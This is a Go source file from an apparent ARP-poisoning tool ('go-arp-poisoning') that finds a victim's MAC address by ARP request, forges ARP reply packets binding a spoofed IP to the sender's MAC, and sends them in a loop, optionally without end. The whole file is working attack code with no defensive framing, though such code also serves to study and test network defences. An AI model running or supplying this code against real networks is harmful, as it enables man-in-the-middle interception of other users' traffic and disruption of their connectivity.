package arp

import (
	"fmt"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/pol-p/go-arp-poisoning/internal/network"
)

func DiscoverVictimMAC(handle *pcap.Handle, iface *net.Interface, victimIP net.IP) (net.HardwareAddr, error) {
	broadcastMAC, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")

	localIP, err := network.GetLocalIPv4(iface)
	if err != nil {
		return nil, err
	}

	ether := &layers.Ethernet{
		SrcMAC:       iface.HardwareAddr,
		DstMAC:       broadcastMAC,
		EthernetType: layers.EthernetTypeARP,
	}

	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   []byte(iface.HardwareAddr),
		SourceProtAddress: []byte(localIP),
		DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},
		DstProtAddress:    []byte(victimIP.To4()),
	}

	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}
	gopacket.SerializeLayers(buffer, opts, ether, arp)
	handle.WritePacketData(buffer.Bytes())

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	timeout := make(chan struct{})
	go func() {
		<-time.After(2 * time.Second)
		close(timeout)
	}()

	for {
		select {
		case packet := <-packetSource.Packets():
			if packet == nil {
				continue
			}
			if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
				arpResp, _ := arpLayer.(*layers.ARP)
				if net.IP(arpResp.SourceProtAddress).Equal(victimIP) && arpResp.Operation == layers.ARPReply {
					return net.HardwareAddr(arpResp.SourceHwAddress), nil
				}
			}
		case <-timeout:
			return nil, fmt.Errorf("timeout esperando respuesta ARP de la víctima")
		}
	}
}

func CreateSpoofPacket(srcMAC, dstMAC net.HardwareAddr, spoofIP, victimIP net.IP) ([]byte, error) {
	ether := &layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}

	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   ether.SrcMAC,
		SourceProtAddress: spoofIP.To4(),
		DstHwAddress:      ether.DstMAC,
		DstProtAddress:    victimIP.To4(),
	}

	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err := gopacket.SerializeLayers(buffer, options, ether, arp)
	if err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

func SendPackets(handle *pcap.Handle, packetData []byte, count int, infinite bool, interval int) error {
	if infinite {
		for {
			err := handle.WritePacketData(packetData)
			if err != nil {
				return err
			}
			time.Sleep(time.Duration(interval) * time.Millisecond)
		}
	} else {
		for i := 0; i < count; i++ {
			err := handle.WritePacketData(packetData)
			if err != nil {
				return err
			}
		}
	}
	return nil
}
